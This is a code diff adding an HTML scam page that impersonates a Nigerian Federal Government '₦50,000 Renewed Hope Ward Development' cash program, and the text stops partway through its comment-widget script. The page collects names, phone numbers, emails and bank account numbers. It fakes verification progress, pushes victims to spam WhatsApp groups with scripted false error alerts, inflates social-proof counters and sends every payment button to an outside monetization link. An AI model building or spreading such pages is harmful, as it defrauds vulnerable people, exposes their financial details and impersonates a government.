@@ -1,0 +1,1369 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <title>RENEWED HOPE WARD DEVELOPMENT PROGRAM</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/svg+xml" href="https://www.rhwdp.gov.ng/logo.svg" />
+<link rel="apple-touch-icon" href="https://www.rhwdp.gov.ng/logo.svg" />
+<link rel="shortcut icon" type="image/svg+xml" href="https://www.rhwdp.gov.ng/logo.svg" />
+<meta name="msapplication-TileImage" content="https://www.rhwdp.gov.ng/logo.svg" />
+<meta name="msapplication-TileColor" content="#1a871c" />
+<meta name="theme-color" content="#1a871c" />
+  <meta name="og:title" content="RENEWED HOPE WARD DEVELOPMENT PROGRAM" />
+  <meta property="og:description" content="FEDERAL GOVERNMENT ₦50,000 WARD DEVELOPMENT FUND" />
+  <meta property="og:type" content="website" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+    * {
+      margin: 0;
+      padding: 0;
+      font-family: Poppins, sans-serif;
+      font-weight: normal;
+      box-sizing: border-box;
+    }
+    body {
+      direction: ltr;
+      background: #ebedf0;
+    }
+    a {
+      text-decoration: none;
+    }
+    .post {
+      background: #fff;
+      margin: 0 auto;
+      padding: 10px;
+      max-width: 500px;
+      border: 1px solid #d0d1d5;
+      border-radius: 3px;
+    }
+    .post img {
+      width: 100%;
+    }
+    .welcome {
+      font-size: 15px;
+    }
+    .amount,
+    #getname {
+      color: #098105;
+      text-decoration: none;
+    }
+    .done {
+      text-align: center;
+      color: #27ae60;
+    }
+    .tip {
+      font-size: 14px;
+    }
+    .title {
+      text-align: center;
+    }
+    .error {
+      display: none;
+      text-align: center;
+      font-size: 14px;
+      color: #e74c3c;
+    }
+    button {
+      display: block;
+      width: 200px;
+      height: 50px;
+      color: #fff;
+      border: none;
+      outline: none;
+      font-size: 24px;
+      cursor: pointer;
+      border-radius: 5px;
+      padding: 0 10px;
+      margin: 10px auto;
+      background: #1a871c;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background: #098105;
+    }
+    .phone {
+      max-width: 400px;
+      margin: 10px auto;
+    }
+    .phone input {
+      width: 100%;
+      height: 50px;
+      padding: 10px;
+      outline: none;
+      border: 2px solid #cecece;
+      font-size: 14px;
+    }
+    #confirm {
+      width: 200px;
+      margin: 10px auto;
+      border-radius: 0px;
+    }
+    #loader {
+      text-align: center;
+    }
+    .spin {
+      width: 50px;
+      height: 50px;
+      background: transparent;
+      border: solid 8px #1a871c;
+      border-right-color: transparent;
+      border-radius: 50%;
+      margin: 10px auto;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      100% {
+        transform: rotate(1turn);
+      }
+    }
+    #loader,
+    #info,
+    #checking,
+    #share,
+    #claim {
+      display: none;
+    }
+    .center {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .barr {
+      direction: ltr;
+      max-width: 400px;
+      margin: 10px auto;
+      box-sizing: border-box;
+    }
+    .fill {
+      position: relative;
+      display: inline-block;
+      width: calc(100% - 100px);
+      height: 35px;
+      padding: 2px;
+      border: 2px solid #098105;
+    }
+    #fill,
+    #fill2 {
+      background: #098105;
+      width: 0%;
+      height: 100%;
+    }
+    .percentage {
+      width: 100px;
+      float: right;
+      height: 35px;
+      font-size: 16px;
+      border: 2px solid #098105;
+    }
+    #percentage,
+    #percentage2 {
+      margin-left: 5px;
+    }
+    #check,
+    #check2 {
+      display: none;
+    }
+    .counter {
+      color: #7f7f7f;
+      font-size: 12px;
+      text-align: right;
+      padding: 10px 0 10px 2px;
+      border-bottom: 1px solid #e1e2e3;
+    }
+    .reactions {
+      display: inline-flex;
+      align-items: center;
+      float: left;
+    }
+    .counter img {
+      float: left;
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      border: 2px solid #fff;
+      box-sizing: content-box;
+    }
+    .like,
+    .love {
+      margin-right: -5px;
+    }
+    .like {
+      z-index: 2;
+    }
+    .love {
+      z-index: 1;
+    }
+    .bar {
+      display: table;
+      width: 100%;
+      border-bottom: 1px solid #e1e2e3;
+    }
+    .bar .react {
+      display: table-cell;
+      width: calc(100% / 3);
+      font-size: 12px;
+      color: #7f7f7f;
+      text-align: center;
+      padding: 10px 0;
+      cursor: pointer;
+    }
+    .comments {
+      direction: ltr;
+    }
+    .comment {
+      padding: 6px 0;
+      margin-top: 5px;
+    }
+    .comment img {
+      float: left;
+      width: 32px;
+      height: 32px;
+      border: none;
+      border-radius: 18px;
+      cursor: pointer;
+    }
+    .reply {
+      margin-left: 37px;
+    }
+    .single-container {
+      margin-left: 37px;
+      background: #f1f2f6;
+      padding: 10px;
+      border-radius: 15px;
+      font-size: 12px;
+    }
+    .single-container .user {
+      display: inline-block;
+      cursor: pointer;
+      color: #365899;
+      margin-bottom: 5px;
+    }
+    .single-container .text {
+      display: block;
+    }
+    .buttons {
+      font-size: 12px;
+      font-weight: bold;
+      margin: 10px 0 0 47px;
+      color: #90949c;
+    }
+    .action {
+      cursor: pointer;
+    }
+    .action:hover {
+      text-decoration: underline;
+    }
+    .input {
+      padding: 6px 12px 12px;
+    }
+    .input input {
+      width: 100%;
+      background: #f1f2f6;
+      padding: 10px;
+      border-radius: 15px;
+      border: 0;
+      outline: none;
+    }
+    .A {
+      text-align: center;
+      background-color: #1a871c;
+    }
+
+    /* ═══════════════════════════════════════════
+       FACEBOOK-STYLE COMMENT WIDGET (Renewed Hope theme)
+       ═══════════════════════════════════════════ */
+    #flc-widget {
+      width: 100%;
+      max-width: 100%;
+      margin: 0 0 22px;
+      background: #ffffff;
+      border-radius: 20px;
+      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1), 0 8px 24px rgba(0, 0, 0, 0.08);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      font-family: 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      color: #1c1e21;
+      box-sizing: border-box;
+      border: 1px solid #d0d1d5;
+    }
+    #flc-widget button {
+      -webkit-tap-highlight-color: transparent;
+    }
+    #flc-widget input {
+      -webkit-tap-highlight-color: transparent;
+    }
+    @keyframes flcPulse {
+      0% { box-shadow: 0 0 0 0 rgba(26, 135, 28, .55); }
+      70% { box-shadow: 0 0 0 7px rgba(26, 135, 28, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(26, 135, 28, 0); }
+    }
+    @keyframes flcPop {
+      0% { opacity: 0; transform: translateY(6px) scale(.94); }
+      100% { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes flcBounce {
+      0%, 60%, 100% { transform: translateY(0); opacity: .5; }
+      30% { transform: translateY(-4px); opacity: 1; }
+    }
+    @keyframes flcHeartUp {
+      0% { opacity: 1; transform: translateY(0) scale(.6); }
+      100% { opacity: 0; transform: translateY(-26px) scale(1.3); }
+    }
+    #flc-widget .flc-comment-row {
+      animation: flcPop .32s cubic-bezier(.2,.9,.3,1.3);
+    }
+    #flc-widget .flc-actions button:hover {
+      color: #1a871c !important;
+    }
+  </style>
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+<!-- CSS_ADSBLOCK_START -->
+<link rel="stylesheet" href="https://adblockers.opera-mini.net/css_block/default-domainless.css" type="text/css" />
+<!-- CSS_ADSBLOCK_END -->
+</head>
+<body>
+
+
+
+  <center>
+    <span class="amount">RHWDP PORTAL</span>
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiy6dfF50G6kz_oTw8X4P-lzTWmnBHOddtdBLPoqot_4nHO1Cx6ezXXqhH_AFEStnHJuXinqYUwDPQW4ckgGCgBN3RApLL8qk68TpVatbPhJYQRaddo_1u4FchkHj53w8My68PZAKKSKbtUwKUc_mUgiFx39m5T0o0KtrMnZe8KWhxjDU7xibQw2pMYKt5A/s320/21636.png" alt="Ward Development" style="width: 100%;">
+  </center>
+  <marquee class="horizontal_marque" direction="left"> RENEWED HOPE WARD DEVELOPMENT PROGRAM 2026/2027 </marquee>
+  <div class="A"></div>
+
+  <div class="post" width="100%">
+    <div id="intro">
+      <p class="welcome">
+        <center>
+          The Application and Disbursement process for <span class="amount"> ₦50,000 RENEWED HOPE WARD DEVELOPMENT PROGRAM 2026/2027 </span>is currently ongoing. This initiative aims to provide financial assistance to all Nigerians. To take advantage of this opportunity, Click on the "GET CASH" button to Enter your Account Details.
+        </center>
+        <br>
+        <center><span class="amount">ONLY FOR </span> NIGERIAN CITIZENS.</center><br>
+      </p>
+      <button id="go">GET CASH</button>
+    </div>
+
+    <div id="loader">
+      <div>Please Wait ...</div>
+      <div class="spin"></div>
+      <div id="num">0%</div>
+    </div>
+
+    <div id="info">
+      <p class="title"> ENTER YOUR INFORMATION:</p>
+      <div class="phone">
+        <center>
+          <input type="char" placeholder="Full Name" id="name" name="Phone" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+          <input type="text" placeholder="Email Address" id="email" name="Email Address" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+          <select id="state" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+            <option value="" selected disabled>Select State</option>
+            <option value="Abia">Abia</option>
+            <option value="Adamawa">Adamawa</option>
+            <option value="Akwa Ibom">Akwa Ibom</option>
+            <option value="Anambra">Anambra</option>
+            <option value="Bauchi">Bauchi</option>
+            <option value="Bayelsa">Bayelsa</option>
+            <option value="Benue">Benue</option>
+            <option value="Borno">Borno</option>
+            <option value="Cross River">Cross River</option>
+            <option value="Delta">Delta</option>
+            <option value="Ebonyi">Ebonyi</option>
+            <option value="Edo">Edo</option>
+            <option value="Ekiti">Ekiti</option>
+            <option value="Enugu">Enugu</option>
+            <option value="Gombe">Gombe</option>
+            <option value="Imo">Imo</option>
+            <option value="Jigawa">Jigawa</option>
+            <option value="Kaduna">Kaduna</option>
+            <option value="Kano">Kano</option>
+            <option value="Katsina">Katsina</option>
+            <option value="Kebbi">Kebbi</option>
+            <option value="Kogi">Kogi</option>
+            <option value="Kwara">Kwara</option>
+            <option value="Lagos">Lagos</option>
+            <option value="Nasarawa">Nasarawa</option>
+            <option value="Niger">Niger</option>
+            <option value="Ogun">Ogun</option>
+            <option value="Ondo">Ondo</option>
+            <option value="Osun">Osun</option>
+            <option value="Oyo">Oyo</option>
+            <option value="Plateau">Plateau</option>
+            <option value="Rivers">Rivers</option>
+            <option value="Sokoto">Sokoto</option>
+            <option value="Taraba">Taraba</option>
+            <option value="Yobe">Yobe</option>
+            <option value="Zamfara">Zamfara</option>
+            <option value="FCT - Abuja">FCT - Abuja</option>
+          </select>
+          <input type="char" placeholder="Phone Number" id="add" name="Phone" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+          <select id="gender" name="gender" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+            <option value="" selected disabled>Select Gender</option>
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+          </select>
+          <input type="char" placeholder="Bank Account Number" id="nums" name="Phone" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+          <select id="bank" style="width: 330px; height: 56px; font-size: 18px; margin-bottom: 20px;">
+            <option value="" selected disabled> Select Your Bank</option>
+            <option value="Access Bank Plc">Access Bank Plc</option>
+            <option value="Citibank Nigeria Limited">Citibank Nigeria Limited</option>
+            <option value="Ecobank Nigeria">Ecobank Nigeria</option>
+            <option value="Fidelity Bank Plc">Fidelity Bank Plc</option>
+            <option value="First Bank of Nigeria Limited">First Bank of Nigeria Limited</option>
+            <option value="First City Monument Bank (FCMB)">First City Monument Bank (FCMB)</option>
+            <option value="Globus Bank Limited">Globus Bank Limited</option>
+            <option value="Guaranty Trust Bank (GTBank)">Guaranty Trust Bank (GTBank)</option>
+            <option value="Heritage Bank Plc">Heritage Bank Plc</option>
+            <option value="Keystone Bank Limited">Keystone Bank Limited</option>
+            <option value="Polaris Bank Limited">Polaris Bank Limited</option>
+            <option value="PremiumTrust Bank">PremiumTrust Bank</option>
+            <option value="Providus Bank Limited">Providus Bank Limited</option>
+            <option value="Stanbic IBTC Bank Plc">Stanbic IBTC Bank Plc</option>
+            <option value="Standard Chartered Bank Nigeria">Standard Chartered Bank Nigeria</option>
+            <option value="Sterling Bank Plc">Sterling Bank Plc</option>
+            <option value="SunTrust Bank Nigeria Limited">SunTrust Bank Nigeria Limited</option>
+            <option value="Titan Trust Bank">Titan Trust Bank</option>
+            <option value="Union Bank of Nigeria Plc">Union Bank of Nigeria Plc</option>
+            <option value="United Bank for Africa (UBA)">United Bank for Africa (UBA)</option>
+            <option value="Unity Bank Plc">Unity Bank Plc</option>
+            <option value="Wema Bank Plc">Wema Bank Plc</option>
+            <option value="Zenith Bank Plc">Zenith Bank Plc</option>
+            <option value="JAIZ Bank Plc">JAIZ Bank Plc</option>
+            <option value="LOTUS Bank">LOTUS Bank</option>
+            <option value="TAJ Bank Limited">TAJ Bank Limited</option>
+            <option value="Kuda Bank">Kuda Bank</option>
+            <option value="Opay">Opay</option>
+            <option value="Palmpay">Palmpay</option>
+            <option value="Moniepoint">Moniepoint</option>
+            <option value="FairMoney Microfinance Bank">FairMoney Microfinance Bank</option>
+            <option value="Carbon">Carbon</option>
+            <option value="VFD Microfinance Bank">VFD Microfinance Bank</option>
+            <option value="GoMoney">GoMoney</option>
+            <option value="Rubies Bank">Rubies Bank</option>
+            <option value="Sparkle Bank">Sparkle Bank</option>
+            <option value="Eyowo">Eyowo</option>
+            <option value="Mintyn Bank">Mintyn Bank</option>
+            <option value="Paga">Paga</option>
+            <option value="TeamApt">TeamApt</option>
+            <option value="MTN MoMo PSB">MTN MoMo PSB</option>
+            <option value="Airtel Smartcash PSB">Airtel Smartcash PSB</option>
+            <option value="9PSB (9mobile Payment Service Bank)">9PSB (9mobile Payment Service Bank)</option>
+            <option value="Others">Others</option>
+          </select>
+          <br>
+          <button id="confirm" onclick="getit()">Submit</button>
+        </center>
+        <p class="error">Please Input Your Name !</p>
+      </div>
+    </div>
+
+    <div id="checking">
+      <p class="title">Please wait a moment...</p>
+      <div class="barr">
+        <div class="fill">
+          <div id="fill"></div>
+        </div>
+        <div class="percentage center">
+          <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+          <span id="check"><i class="fa fa-check-circle"></i></span>
+          <span id="percentage"></span>
+        </div>
+      </div>
+    </div>
+
+    <div id="share">
+      <center>
+        <div style="font-family: Arial, sans-serif; line-height: 1.6; max-width: 600px; margin: auto; background: #fff; border: 1px solid #ddd; border-radius: 10px; padding: 20px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+          <h2 style="color: darkgreen; text-align: left; font-size: 18px; margin: 5px 0; font-weight: 600; line-height: 1.4;">
+            ₦50,000 RENEWED HOPE WARD DEVELOPMENT PROGRAM
+          </h2>
+          <p style="font-size: 16px; color: #333; text-align: left;">Dear Applicant,</p>
+          <p style="font-size: 16px; color: #333;">
+            Your application for the <b>₦50,000 RENEWED HOPE WARD DEVELOPMENT PROGRAM</b> from the
+            <b>Federal Government</b> is currently <b style="color: darkred;">under review</b>.
+            Kindly follow the steps below to complete your verification process.
+          </p>
+          <div style="background: #f9f9f9; padding: 15px; border-left: 4px solid green; margin: 20px 0;">
+            <p><b>Application Details (for verification purposes):</b></p>
+            <p><b>Name:</b> <span id="getname" style="color: green;"></span></p>
+            <p><b>Account Number:</b> <span id="getnum" style="color: green;"></span></p>
+            <p><b>Phone Number:</b> <span id="getadd" style="color: green;"></span></p>
+            <p><b>Email:</b> <span id="getemail" style="color: green;"></span></p>
+            <p><b>State:</b> <span id="getstate" style="color: green;"></span></p>
+            <p><b>Bank:</b> <span id="getbank" style="color: green;"></span></p>
+          </div>
+        </div>
+      </center>
+      <p>
+        <br>
+      <h3 style="color: green;">🎉 Congratulations!</h3>
+      <br>
+      <p style="font-size: 16px; color: #333;">
+        Your application has been <b>successfully received</b>, and you have been
+        <b>pre-qualified</b> to receive the <b>₦50,000 RENEWED HOPE WARD DEVELOPMENT FUND</b>.
+      </p>
+      <br>
+      <p style="font-size: 16px; color: #333;">
+        To finalize your payment, please <b>complete the human verification process</b>
+        by following the instructions below. Once verification is completed, your
+        account will be credited within <b>24–48 hours</b>.
+      </p>
+      </p><br>
+      <p class="tip">1. Share this information with others (5 groups or 15 friends on WhatsApp) (Click on the "SHARE" icon below).</p>
+      <br>
+      <p class="tip">2. You will be redirected automatically to our "<b>Human verification approved page</b>" after the GREEN verification bar is filled.</p>
+      <br>
+      <p class="tip">3. Click on confirm after completing the human verification task.</p>
+      <button id="whatsapp">SHARE</button>
+      <div class="barr">
+        <div class="fill">
+          <div id="fill2"></div>
+        </div>
+        <div class="percentage center">
+          <span><i class="fa fa-spinner fa-pulse"></i></span>
+          <span id="percentage2">0%</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ═══════════════════════════════════════════
+         CLAIM SECTION (hidden until share bar hits 100%)
+         ═══════════════════════════════════════════ -->
+    <div id="claim">
+      <style>
+        @keyframes blink {
+          0% { opacity: 1; }
+          50% { opacity: 0; }
+          100% { opacity: 1; }
+        }
+      </style>
+      <br>
+      <p class="title">Your information has been received.
+        Click the link below to approve your payment to the bank details you provided during the registration process.
+        Please note that payments may take 24 to 48 hours to reflect, as a large number of beneficiaries are currently being processed.</p>
+      <br />
+      <a onclick="window.open('https://otieu.com/4/10077877')" href="https://otieu.com/4/10077877">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 0; width: 100%;" class="btn btn-primary"><font color="#ffffff">GET PAYMENT</font></button>
+      </a><br />
+      <a onclick="window.open('https://otieu.com/4/10077877')" href="https://otieu.com/4/10077877">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 0; width: 100%;" class="btn btn-primary"><font color="#ffffff">GET CONFIRMATION EMAIL</font></button>
+      </a><br />
+      <a onclick="window.open('https://otieu.com/4/10077877')" href="https://otieu.com/4/10077877">
+        <button style="display: flex; align-items: center; justify-content: center; margin: 0; width: 100%;" class="btn btn-primary"><font color="#ffffff">CHECK PAYMENT STATUS</font></button>
+      </a><br />
+      <button id="offer" style="width: 330px; height: 56px; font-size: 18px; font-weight: bold; background-color: #28a745; color: white; border: none; border-radius: 6px; cursor: pointer;">
+        APPROVE PAYMENT
+      </button>
+    </div>
+
+    <!-- ═══════════════════════════════════════════
+         FACEBOOK-STYLE COMMENT WIDGET
+         ═══════════════════════════════════════════ -->
+    <div id="commentSection">
+      <div id="flc-widget">
+        <!-- reaction summary -->
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px 8px;font-size:13.5px;color:#606770;box-sizing:border-box;border-bottom:1px solid #e1e2e3;">
+          <div style="display:flex;align-items:center;gap:6px;">
+            <span style="display:inline-flex;align-items:center;">
+              <span style="width:18px;height:18px;border-radius:50%;background:#1a871c;display:flex;align-items:center;justify-content:center;border:2px solid #fff;z-index:2;">
+                <svg viewBox="0 0 24 24" width="11" height="11" style="fill:#fff;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
+              </span>
+              <span style="width:18px;height:18px;border-radius:50%;background:#F33E58;display:flex;align-items:center;justify-content:center;border:2px solid #fff;margin-left:-6px;z-index:1;">
+                <svg viewBox="0 0 24 24" width="10" height="10" style="fill:#fff;"><path d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z"/></svg>
+              </span>
+            </span>
+            <span id="flcLikeTotal" style="color:#606770;">134K</span>
+          </div>
+          <div style="display:flex;gap:12px;">
+            <span><b id="flcCommentCount" style="color:#606770;font-weight:400;">23K</b> comments</span>
+            <span id="flcShareCount" style="color:#606770;">12K shares</span>
+          </div>
+        </div>
+        <!-- like / comment / share bar -->
+        <div style="display:flex;border-top:1px solid #e1e2e3;border-bottom:1px solid #e1e2e3;box-sizing:border-box;">
+          <button type="button" id="flcPostLikeBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#606770;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg> Like
+          </button>
+          <button type="button" id="flcPostCommentBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#606770;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 00-2-2z"/></svg> Comment
+          </button>
+          <button type="button" id="flcPostShareBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#606770;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z"/></svg> Share
+          </button>
+        </div>
+        <div id="flcTypingStatus" style="min-height:18px;padding:4px 16px 0;font-size:12.5px;color:#606770;box-sizing:border-box;"></div>
+        <!-- comment list -->
+        <div id="flcComments" style="padding:10px 14px;overflow-y:auto;max-height:min(60vh,440px);scroll-behavior:smooth;box-sizing:border-box;-webkit-overflow-scrolling:touch;"></div>
+        <!-- composer -->
+        <div style="padding:10px 14px 12px;border-top:1px solid #e1e2e3;background:#f9f9f9;box-sizing:border-box;">
+          <div style="display:flex;gap:8px;align-items:center;">
+            <div id="flcYouAvatar" title="Click to set your profile picture" style="position:relative;width:32px;height:32px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#e4e6eb;cursor:pointer;"></div>
+            <input type="file" id="flcProfilePicInput" accept="image/*" style="display:none;" />
+            <form id="flcComposerForm" style="flex:1;display:flex;gap:8px;align-items:center;min-width:0;">
+              <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200" style="flex:1;min-width:0;border:none;background:#f0f2f5;border-radius:20px;padding:9px 14px;font-size:16px;font-family:inherit;outline:none;color:#1c1e21;box-sizing:border-box;" />
+              <button type="button" id="flcAttachBtn" aria-label="Add photo" title="Add photo" style="border:none;background:#f0f2f5;color:#606770;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+                <svg viewBox="0 0 24 24" width="16" height="16" style="fill:currentColor;"><path d="M9 3l-1.8 2H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10zm0-2a3 3 0 100-6 3 3 0 000 6z"/></svg>
+              </button>
+              <input type="file" id="flcFileInput" accept="image/*" style="display:none;" />
+              <button type="submit" aria-label="Send" style="border:none;background:#1a871c;color:#fff;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+                <svg viewBox="0 0 24 24" width="16" height="16" style="fill:#fff;transform:translateX(1px);"><path d="M2 21l21-9L2 3v7l15 2-15 2z"/></svg>
+              </button>
+            </form>
+          </div>
+          <div id="flcAttachPreview" style="display:none;margin:8px 0 0 42px;position:relative;width:88px;">
+            <img id="flcAttachImg" src="" alt="Attached image preview" style="width:88px;height:88px;object-fit:cover;border-radius:10px;border:1px solid #d0d1d5;display:block;" />
+            <div id="flcAttachRemove" style="position:absolute;top:-6px;right:-6px;width:22px;height:22px;border-radius:50%;background:rgba(0,0,0,.8);color:#fff;border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:12px;line-height:1;cursor:pointer;">✕</div>
+          </div>
+        </div>
+      </div>
+    </div>
+<!-- Supercounter -->
+    <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1738683,"ffffff","ffffff");</script></center>
+  </div>
+
+  <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+  <script type="text/javascript">
+    var time = 0;
+    window.setInterval(function () {
+      time = time + 1;
+      $(".t1").html(time + 1 + "m");
+      $(".t2").html(time + 2 + "m");
+      $(".t3").html(time + 4 + "m");
+    }, 6e4);
+    var likes = 134,
+      comments = 23,
+      shares = 12;
+    window.setInterval(function () {
+      likes = likes + Math.floor(Math.random() * 3);
+      comments = comments + Math.floor(Math.random() * 2);
+      shares = shares + Math.floor(Math.random() * 2);
+      $("#likes").html(likes + "K");
+      $("#comments").html(comments + "K comments");
+      $("#shares").html(shares + "K shares");
+    }, 5e3);
+    $(".liked").click(function () {
+      if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+      } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+      }
+    });
+  </script>
+
+  <script type="text/javascript">
+    $("#go").click(function () {
+      $("#intro").fadeOut(0);
+      $("#loader").fadeIn(1000);
+      var i = 0;
+      var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+          clearInterval(interval);
+          $("#loader").fadeOut(0);
+          $("#info").fadeIn(1000);
+        }
+      }, 50);
+    });
+    $("#confirm").click(function () {
+      if ($("#name").val().length < 4) {
+        $(".error").fadeIn(500);
+      } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+          i += 1;
+          $("#percentage").text(i + "%");
+          $("#fill").css("width", i + "%");
+          if (i == 50) {
+            i = 49;
+            setTimeout(function () {
+              i = 50;
+            }, 1000);
+          }
+          if (i >= 100) {
+            clearInterval(interval);
+            $("#load").fadeOut(0);
+            $("#check").fadeIn(0);
+            setTimeout(function () {
+              $("#checking").fadeOut(0);
+              $("#share").fadeIn(1000);
+              $("#getname").html($("#name").val());
+            }, 500);
+          }
+        }, 50);
+      }
+    });
+    $(document).click(function () {
+      if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+      }
+    });
+  </script>
+
+  <script>
+    $("#email").on("input", function () {
+      $("#getemail").html($(this).val());
+      $("#getemail").css("color", "green");
+    });
+    $("#state").on("change", function () {
+      $("#getstate").html($(this).val());
+      $("#getstate").css("color", "green");
+    });
+    $("#bank").on("change", function () {
+      $("#getbank").html($(this).val());
+      $("#getbank").css("color", "green");
+    });
+  </script>
+
+  <script>
+    var text1 = "*APPLY FOR RENEWED HOPE WARD DEVELOPMENT PROGRAM 2026/2027*%0A%0AAre you a Citizen of Nigeria? The Federal Government has approved the payment of *₦50,000 RENEWED HOPE WARD DEVELOPMENT FUND* for all the Nigerians across the States.%0A%0AAPPLY HERE👉: metaink.xyz/RENEWED-HOPE-WARD-DEVELOPMENT %0A%0ASHARE WITH OTHER NIGERIANS TO BENEFIT.",
+      text2 = " an amount of ",
+      text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+      error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+      abcde = "https://otieu.com/4/10077877",
+      saved = "",
+      share = "whatsapp://send?text=" + text1;
+  </script>
+
+  <script>
+    var width = 0;
+  </script>
+
+  <script>
+    $("#whatsapp").click(function () {
+      window.location.href = share;
+
+      if (width == 0) {
+        width += 50;
+      } else if (width == 50) {
+        alert(error);
+        width += 15;
+      } else if (width == 65) {
+        width += 5;
+      } else if (width == 70) {
+        alert(error);
+        width += 10;
+      } else if (width == 80) {
+        alert(error);
+        width += 5;
+      } else if (width == 85) {
+        width += 2;
+      } else if (width == 87) {
+        width += 1;
+      } else if (width == 88) {
+        width += 2;
+      } else if (width == 90) {
+        width += 1;
+      } else if (width == 91) {
+        width += 1;
+      } else if (width == 92) {
+        width += 1;
+      } else if (width == 93) {
+        width += 1;
+      } else if (width == 94) {
+        width += 1;
+      } else if (width == 95) {
+        width += 1;
+      } else if (width == 96) {
+        width += 2;
+      } else {
+        $("#share").fadeOut(0);
+        $("#claim").fadeIn(1000);
+      }
+
+      setTimeout(function () {
+        $("#fill2").css("width", width + "%");
+        $("#percentage2").text(width + "%");
+      }, 2000);
+    });
+
+    $("#offer").click(function () {
+      window.open(abcde, "_blank");
+    });
+  </script>
+
+  <script>
+    var nums = document.getElementById('nums');
+    var add = document.getElementById('add');
+    var getnum = document.getElementById('getnum');
+    var getadd = document.getElementById('getadd');
+    function getit() {
+      nums = nums.value;
+      add = add.value;
+      getnum.innerHTML = nums;
+      getnum.style.color = "green";
+      getadd.innerHTML = add;
+      getadd.style.color = "green";
+    }
+  </script>
+
+  <!-- ═══════════════════════════════════════════
+       FACEBOOK-STYLE COMMENT WIDGET SCRIPT
+       ═══════════════════════════════════════════ -->
+  <script>
+    (function() {
+      // ─── Renewed Hope themed comment data ───
+      const NAMES = [
+        "Chinedu Okafor", "Aisha Bello", "Oluwaseun Adeyemi", "Emeka Nwosu",
